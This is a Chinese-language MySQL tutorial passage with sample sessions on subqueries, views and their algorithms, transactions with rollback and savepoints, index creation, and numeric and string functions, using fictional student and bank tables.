<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查找及格的同学</span><br><span class="line">mysql&gt; select * from stuinfo where stuno in (select stuno from stumarks where writtenexam&gt;=60);</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           |</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 查询不及格的同学</span><br><span class="line">mysql&gt; select * from stuinfo where stuno in (select stuno from stumarks where writtenexam&lt;60);</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 查询需要补考的学生</span><br><span class="line">mysql&gt; select * from stuinfo where stuno not in (select stuno from stumarks where writtenexam&gt;=60);</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          |</span><br><span class="line">| s25305 | 诸葛丽丽         | 女      |     23 |       7 | 河南           |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |</span><br><span class="line">| s25319 | 梅超风        | 女      |     23 |       5 | 河北          |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-3-3-行子查询"><a href="#1-3-3-行子查询" class="headerlink" title="1.3.3  行子查询"></a>1.3.3  行子查询</h4><p>特点：子查询返回的结果是多个字段组成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查找语文成绩最高的男生和女生</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from stu where(stusex,ch) in (select stusex,max(ch) from stu group by stusex);</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |   86 |   92 |</span><br><span class="line">| s25321 | Tabm     | 女      |     23 |       9 | 河北          |   88 |   77 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-3-4-表子查询"><a href="#1-3-4-表子查询" class="headerlink" title="1.3.4  表子查询"></a>1.3.4  表子查询</h4><p>特点：将子查询的结果作为表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查找语文成绩最高的男生和女生</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from stu order by ch desc) t group by stusex;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25321 | Tabm     | 女      |     23 |       9 | 河北          |   88 |   77 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |   86 |   92 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>注意：from后面跟的是数据源，如果将子查询当成表来看， 必须给结果集取别名。</p>
<h4 id="1-3-5-exists子查询"><a href="#1-3-5-exists子查询" class="headerlink" title="1.3.5  exists子查询"></a>1.3.5  exists子查询</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 如果笔试成绩有人超过80人，就显示所有学生信息</span><br><span class="line">mysql&gt; select * from stuinfo where exists (select * from stumarks where writtenexam&gt;=80);</span><br><span class="line"></span><br><span class="line">-- 没有超过80的学生，就显示所有学生信息</span><br><span class="line">mysql&gt; select * from stuinfo where not exists (select * from stumarks where writtenexam&gt;=80);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>作用：提高查询效率</p>
<h2 id="1-4-视图"><a href="#1-4-视图" class="headerlink" title="1.4  视图"></a>1.4  视图</h2><h4 id="1-4-1-概述"><a href="#1-4-1-概述" class="headerlink" title="1.4.1  概述"></a>1.4.1  概述</h4><p>1、视图是一张虚拟表，它表示一张表的部分数据或多张表的综合数据，其结构和数据是建立在对表的查询基础上</p>
<p>2、视图中并不存放数据，而是存放在视图所引用的原始表（基表）中</p>
<p>3、同一张原始表，根据不同用户的不同需求，可以创建不同的视图</p>
<h4 id="1-4-2-作用"><a href="#1-4-2-作用" class="headerlink" title="1.4.2  作用"></a>1.4.2  作用</h4><p>1、筛选表中的行</p>
<p>2、防止未经许可的用户访问敏感数据</p>
<p>3、隐藏数据表的结构</p>
<p>4、降低数据表的复杂程度</p>
<h4 id="1-4-3-创建视图"><a href="#1-4-3-创建视图" class="headerlink" title="1.4.3  创建视图"></a>1.4.3  创建视图</h4><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建视图</span><br><span class="line">create view 视图名</span><br><span class="line">as </span><br><span class="line">	select 语句；</span><br><span class="line">	</span><br><span class="line">-- 查询视图</span><br><span class="line">select 列名 from 视图</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建视图</span><br><span class="line">mysql&gt; create view view1</span><br><span class="line">    -&gt; as</span><br><span class="line">    -&gt; select * from stu where ch&gt;=60 and math&gt;=60;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 查询视图</span><br><span class="line">mysql&gt; select * from view1;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          |   77 |   76 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |   86 |   92 |</span><br><span class="line">| s25319 | 梅超风        | 女      |     23 |       5 | 河北          |   74 |   67 |</span><br><span class="line">| s25320 | Tom      | 男       |     24 |       8 | 北京           |   65 |   67 |</span><br><span class="line">| s25321 | Tabm     | 女      |     23 |       9 | 河北          |   88 |   77 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">5 rows in set (0.02 sec)</span><br><span class="line"></span><br><span class="line">-- 视图可以使得降低SQL语句的复杂度</span><br><span class="line">mysql&gt; create view view2</span><br><span class="line">    -&gt; as</span><br><span class="line">    -&gt; select stuno,stusex,writtenexam,labexam from stuinfo natural join stumarks;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-4-4-修改视图"><a href="#1-4-4-修改视图" class="headerlink" title="1.4.4  修改视图"></a>1.4.4  修改视图</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter view 视图名</span><br><span class="line">as</span><br><span class="line">	select 语句</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter view view2</span><br><span class="line">    -&gt; as</span><br><span class="line">    -&gt; select stuname from stuinfo;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-4-5-删除视图"><a href="#1-4-5-删除视图" class="headerlink" title="1.4.5  删除视图"></a>1.4.5  删除视图</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop view [if exists ] 视图1，视图,...</span><br></pre></td></tr></table></figure>

<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop view view2;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-4-6-查看视图信息"><a href="#1-4-6-查看视图信息" class="headerlink" title="1.4.6  查看视图信息"></a>1.4.6  查看视图信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 方法一；</span><br><span class="line">mysql&gt; show tables;	-- 显示所有的表和视图</span><br><span class="line"></span><br><span class="line">-- 方法二：精确查找视图（视图信息存储在information_schema下的views表中）</span><br><span class="line">mysql&gt; select table_name from information_schema.views;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| view1      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.05 sec)</span><br><span class="line"></span><br><span class="line">-- 方法三：通过表的comment属性查询视图</span><br><span class="line">mysql&gt; show table status\G;		-- 查询所有表和视图的详细状态信息</span><br><span class="line">mysql&gt; show table status where comment=&#x27;view&#x27;\G   -- 只查找视图信息</span><br></pre></td></tr></table></figure>

<p>查询视图的结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; desc view1;</span><br></pre></td></tr></table></figure>



<p>查询创建视图的语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show create view view1\G</span><br></pre></td></tr></table></figure>



<h4 id="1-4-7-视图算法"><a href="#1-4-7-视图算法" class="headerlink" title="1.4.7  视图算法"></a>1.4.7  视图算法</h4><p>场景：找出语文成绩最高的男生和女生</p>
<p>方法一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from (select * from stu order by ch desc) t group by stusex;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25321 | Tabm     | 女      |     23 |       9 | 河北          |   88 |   77 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |   86 |   92 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create view view3</span><br><span class="line">    -&gt; as</span><br><span class="line">    -&gt; select * from stu order by ch desc;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from view3 group by stusex;</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25301 | 张秋丽        | 男       |     18 |       1 | 北京           |   80 | NULL |</span><br><span class="line">| s25303 | 李斯文       | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>结论：方法一和方法二的结果不一样，这是因为视图的算法造成的。</p>
<p>视图的算法有：</p>
<p>1、merge：合并算法（将视图语句和外层语句合并后再执行）</p>
<p>2、temptable:临时表算法（将视图作为一个临时表来执行）</p>
<p>3、undefined：未定义算法（用哪种算法有MySQL决定，这是默认算法，视图一般会选merge算法）</p>
<p>重新通过视图实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建视图，指定算法为临时表算法</span><br><span class="line">mysql&gt; create or replace algorithm=temptable view view3</span><br><span class="line">    -&gt; as</span><br><span class="line">    -&gt; select * from stu order by ch desc;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from view3 group by stusex;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25321 | Tabm     | 女      |     23 |       9 | 河北          |   88 |   77 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |   86 |   92 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>结论：和子查询结果一致。</p>
<h2 id="1-5-事务"><a href="#1-5-事务" class="headerlink" title="1.5  事务"></a>1.5  事务</h2><h4 id="1-5-1-概述"><a href="#1-5-1-概述" class="headerlink" title="1.5.1  概述"></a>1.5.1  概述</h4><p>事务(TRANSACTION)是一个整体，要么一起执行，要么一起不执行</p>
<h4 id="1-5-2-事务特性"><a href="#1-5-2-事务特性" class="headerlink" title="1.5.2  事务特性"></a>1.5.2  事务特性</h4><p>事务必须具备以下四个属性，简称ACID 属性：</p>
<p>原子性（Atomicity）：事务是一个完整的操作。事务的各步操作是不可分的（原子的）；要么都执行，要么都不执行</p>
<p>一致性（Consistency）：当事务完成时，数据必须处于一致状态</p>
<p>隔离性（Isolation）：对数据进行修改的所有并发事务是彼此隔离的。</p>
<p>永久性（Durability）：事务完成后，它对数据库的修改被永久保持。</p>
<h4 id="1-5-3-事务处理"><a href="#1-5-3-事务处理" class="headerlink" title="1.5.3  事务处理"></a>1.5.3  事务处理</h4><p>开启事务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start transaction  或 begin [work]</span><br></pre></td></tr></table></figure>

<p>提交事务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">commit</span><br></pre></td></tr></table></figure>

<p>回滚事务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rollback</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 插入测试数据</span><br><span class="line">mysql&gt; create table bank(</span><br><span class="line">    -&gt; card char(4) primary key comment &#x27;卡号&#x27;,</span><br><span class="line">    -&gt; money decimal(10,2) not null</span><br><span class="line">    -&gt; )engine=innodb charset=utf8;</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into bank values (&#x27;1001&#x27;,1000),(&#x27;1002&#x27;,1);</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">-- 开启事务</span><br><span class="line">mysql&gt; begin;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; delimiter //   -- 更改定界符</span><br><span class="line">mysql&gt; update bank set money=money-100 where card=&#x27;1001&#x27;;</span><br><span class="line">    -&gt; update bank set money=money+100 where card=&#x27;1002&#x27; //</span><br><span class="line">Query OK, 1 row affected (0.04 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">-- 回滚事务</span><br><span class="line">mysql&gt; rollback //</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from bank  //</span><br><span class="line">+------+---------+</span><br><span class="line">| card | money   |</span><br><span class="line">+------+---------+</span><br><span class="line">| 1001 | 1000.00 |</span><br><span class="line">| 1002 |    1.00 |</span><br><span class="line">+------+---------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">-- 开启事务</span><br><span class="line">mysql&gt; start transaction  //</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; update bank set money=money-100 where card=&#x27;1001&#x27;;</span><br><span class="line">    -&gt; update bank set money=money+100 where card=&#x27;1002&#x27; //</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">-- 提交事务</span><br><span class="line">mysql&gt; commit //</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from bank //</span><br><span class="line">+------+--------+</span><br><span class="line">| card | money  |</span><br><span class="line">+------+--------+</span><br><span class="line">| 1001 | 900.00 |</span><br><span class="line">| 1002 | 101.00 |</span><br><span class="line">+------+--------+</span><br></pre></td></tr></table></figure>



<p>设置事务的回滚点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 开启事务</span><br><span class="line">mysql&gt; begin  //</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into bank values (&#x27;1003&#x27;,500) //</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 记录事务的回滚点</span><br><span class="line">mysql&gt; savepoint a1  //</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into bank values (&#x27;1004&#x27;,200) //</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 回滚到回滚点</span><br><span class="line">mysql&gt; rollback  to a1  //</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">-- 查询</span><br><span class="line">mysql&gt; select * from bank //</span><br><span class="line">+------+--------+</span><br><span class="line">| card | money  |</span><br><span class="line">+------+--------+</span><br><span class="line">| 1001 | 900.00 |</span><br><span class="line">| 1002 | 101.00 |</span><br><span class="line">| 1003 | 500.00 |</span><br><span class="line">+------+--------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>自动提交事务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每一个SQL语句都是一个独立的事务</span><br></pre></td></tr></table></figure>



<p>小结：</p>
<p>1、事务是事务开启的时候开始</p>
<p>2、提交事务、回滚事务后事务都结束</p>
<p>3、只有innodb支持事务</p>
<p>4、一个SQL语句就是一个独立的事务，开启事务是将多个SQL语句放到一个事务中执行</p>
<h2 id="1-6-索引"><a href="#1-6-索引" class="headerlink" title="1.6  索引"></a>1.6  索引</h2><h4 id="1-6-1-概述"><a href="#1-6-1-概述" class="headerlink" title="1.6.1 概述"></a>1.6.1 概述</h4><p>优点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加快查询速度</span><br></pre></td></tr></table></figure>

<p>缺点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">带索引的表在数据库中需要更多的存储空间</span><br><span class="line">增、删、改命令需要更长的处理时间，因为它们需要对索引进行更新</span><br></pre></td></tr></table></figure>



<h4 id="1-6-2-创建索引的指导原则"><a href="#1-6-2-创建索引的指导原则" class="headerlink" title="1.6.2  创建索引的指导原则"></a>1.6.2  创建索引的指导原则</h4><p>适合创建索引的列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、该列用于频繁搜索</span><br><span class="line">2、该列用于对数据进行排序</span><br><span class="line">3、在WHERE子句中出现的列，在join子句中出现的列。</span><br></pre></td></tr></table></figure>

<p>请不要使用下面的列创建索引：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、列中仅包含几个不同的值。</span><br><span class="line">2、表中仅包含几行。为小型表创建索引可能不太划算，因为MySQL在索引中搜索数据所花的时间比在表中逐行搜索所花的时间更长 </span><br></pre></td></tr></table></figure>



<h4 id="1-6-3-创建索引"><a href="#1-6-3-创建索引" class="headerlink" title="1.6.3  创建索引"></a>1.6.3  创建索引</h4><p>1、主键索引：主要创建了主键就会自动的创建主键索引</p>
<p>2、唯一索引：创建唯一键就创建了唯一索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建表的时候添加唯一索引</span><br><span class="line">create table t5(</span><br><span class="line">    id int primary key,</span><br><span class="line">    name varchar(20),</span><br><span class="line">    unique ix_name(name)	-- 添加唯一索引</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 给表添加唯一索引</span><br><span class="line">mysql&gt; create table t5(</span><br><span class="line">    -&gt; name varchar(20),</span><br><span class="line">    -&gt; addr varchar(50)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create unique index ix_name on t5(name);</span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">-- 通过更改表的方式创建唯一索引</span><br><span class="line">mysql&gt; alter table t5 add unique ix_addr (addr);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<p>普通索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建表的时候添加普通索引</span><br><span class="line">mysql&gt; create table t6(</span><br><span class="line">    -&gt;        id int primary key,</span><br><span class="line">    -&gt;        name varchar(20),</span><br><span class="line">    -&gt;        index ix_name(name)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">-- 给表添加普通索引</span><br><span class="line">mysql&gt; create table t7(</span><br><span class="line">    -&gt; name varchar(20),</span><br><span class="line">    -&gt; addr varchar(50)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create index ix_name on t7(name) ;</span><br><span class="line">Query OK, 0 rows affected (0.08 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">-- 通过更改表的方式创建索引</span><br><span class="line">mysql&gt; alter table t7 add index ix_addr(addr);</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、创建主键就会创建主键索引</p>
<p>2、创建唯一键就会创建唯一索引</p>
<p>3、创建唯一键的语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--语法一</span><br><span class="line">create unique [index] 索引名 on 表名（字段名）</span><br><span class="line">-- 方法二</span><br><span class="line">alter table 表名 add uniqe [index] 索引名(字段名)</span><br></pre></td></tr></table></figure>

<p>4、创建普通索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 语法一</span><br><span class="line">create index 索引名 on 表名（字段名）</span><br><span class="line">-- 语法二</span><br><span class="line">alter table 表名 add index 索引名(字段名)</span><br></pre></td></tr></table></figure>

<p>5、索引创建后，数据库根据查询语句自动选择索引</p>
<h4 id="1-6-4-删除索引"><a href="#1-6-4-删除索引" class="headerlink" title="1.6.4  删除索引"></a>1.6.4  删除索引</h4><p>语法：drop index 索引名 on 表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop index ix_name on t7;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<h2 id="1-7-函数"><a href="#1-7-函数" class="headerlink" title="1.7  函数"></a>1.7  函数</h2><h4 id="1-7-1-数字类"><a href="#1-7-1-数字类" class="headerlink" title="1.7.1  数字类"></a>1.7.1  数字类</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 获取随机数</span><br><span class="line">mysql&gt; select rand();</span><br><span class="line">+------------------+</span><br><span class="line">| rand()           |</span><br><span class="line">+------------------+</span><br><span class="line">| 0.25443412666622 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 随机排序</span><br><span class="line">mysql&gt; select * from stuinfo order by rand();</span><br><span class="line"></span><br><span class="line">-- 随机获取一条记录</span><br><span class="line">mysql&gt; select * from stuinfo order by rand() limit 1;</span><br><span class="line"></span><br><span class="line">-- 四舍五入，向上取整，向下取整</span><br><span class="line">mysql&gt; select round(3.1415926,3) &#x27;四舍五入&#x27;,truncate(3.14159,3) &#x27;截取数据&#x27;,ceil(3.1) &#x27;向上取整&#x27;,floor(3.9) &#x27;向下取整&#x27;;</span><br><span class="line">+----------+----------+----------+----------+</span><br><span class="line">| 四舍五入  | 截取数据  | 向上取整   | 向下取整        |</span><br><span class="line">+----------+----------+----------+----------+</span><br><span class="line">|    3.142 |    3.141 |        4 |        3 |</span><br><span class="line">+----------+----------+----------+----------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line">注意： 截取数据直接截取，不四舍五入</span><br></pre></td></tr></table></figure>



<h4 id="1-7-2-字符串类"><a href="#1-7-2-字符串类" class="headerlink" title="1.7.2 字符串类"></a>1.7.2 字符串类</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 大小写转换</span><br><span class="line">mysql&gt; select ucase(&#x27;i name is tom&#x27;) &#x27;转成大写&#x27;,lcase(&#x27;My Name IS TOM&#x27;) &#x27;转成小写&#x27;;</span><br><span class="line">+---------------+----------------+</span><br><span class="line">| 转成大写       | 转成小写         |</span><br><span class="line">+---------------+----------------+</span><br><span class="line">| I NAME IS TOM | my name is tom |</span><br><span class="line">+---------------+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 截取字符串</span><br><span class="line">mysql&gt; select left(&#x27;abcdef&#x27;,3) &#x27;从左边截取&#x27;,right(&#x27;abcdef&#x27;,3) &#x27;从右边截取&#x27;,substring(&#x27;abcdef&#x27;,2,3) &#x27;字符串&#x27;;</span><br><span class="line">+------------+------------+--------+</span><br><span class="line">| 从左边截取  | 从右边截取    | 字符串      |</span><br><span class="line">+------------+------------+--------+</span><br><span class="line">| abc        | def        | bcd    |</span><br><span class="line">+------------+------------+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 字符串相连</span><br><span class="line">mysql&gt; select concat(&#x27;中国&#x27;,&#x27;北京&#x27;,&#x27;顺义&#x27;) &#x27;地址&#x27;;</span><br><span class="line">+--------------+</span><br><span class="line">| 地址            |</span><br><span class="line">+--------------+</span><br><span class="line">| 中国北京顺义           |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(stuname,&#x27;-&#x27;,stusex) 信息 from stuinfo;</span><br><span class="line">+-------------+</span><br><span class="line">| 信息           |</span><br><span class="line">+-------------+</span><br><span class="line">| 张秋丽-男           |</span><br><span class="line">| 李文才-男          |</span><br><span class="line">| 李斯文-女         |</span><br><span class="line">| 欧阳俊雄-男          |</span><br><span class="line">| 诸葛丽丽-女          |</span><br><span class="line">| 争青小子-男          |</span><br><span class="line">| 梅超风-女         |</span><br><span class="line">+-------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- coalesce(str1,str2)  :str1有值显示str1,如果str1为空就显示str2</span><br><span class="line">-- 将成绩为空的显示为缺考</span><br><span class="line">mysql&gt; select stuname,coalesce(writtenexam,&#x27;缺考&#x27;),coalesce(labexam,&#x27;缺考&#x27;) from stuinfo natural left join stumarks;</span><br><span class="line">+----------+------------------------------+--------------------------+</span><br><span class="line">| stuname  | coalesce(writtenexam,&#x27;缺考&#x27;)    | coalesce(labexam,&#x27;缺考&#x27;)    |</span><br><span class="line">+----------+------------------------------+--------------------------+</span><br><span class="line">| 张秋丽         | 77                          | 82                       |</span><br><span class="line">| 李文才        | 50                           | 90                       |</span><br><span class="line">| 李斯文        | 80                           | 58                       |</span><br><span class="line">| 欧阳俊雄        | 65                           | 50                       |</span><br><span class="line">| 诸葛丽丽         | 缺考                            | 缺考                        |</span><br><span class="line">| 争青小子        | 56                           | 48                       |</span><br><span class="line">| 梅超风        | 缺考                            | 缺考                        |</span><br><span class="line">+----------+------------------------------+--------------------------+</span><br><span class="line">7 rows in set (0.02 sec)</span><br><span class="line"></span><br><span class="line">-- length（）:字节长度，char_length()：字符长度</span><br><span class="line">mysql&gt; select length(&#x27;锄禾日当午&#x27;) 字节,char_length(&#x27;锄禾日当午&#x27;) 字符;</span><br><span class="line">+------+------+</span><br><span class="line">| 字节  | 字符    |</span><br><span class="line">+------+------+</span><br><span class="line">|   10 |    5 |</span><br><span class="line">+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



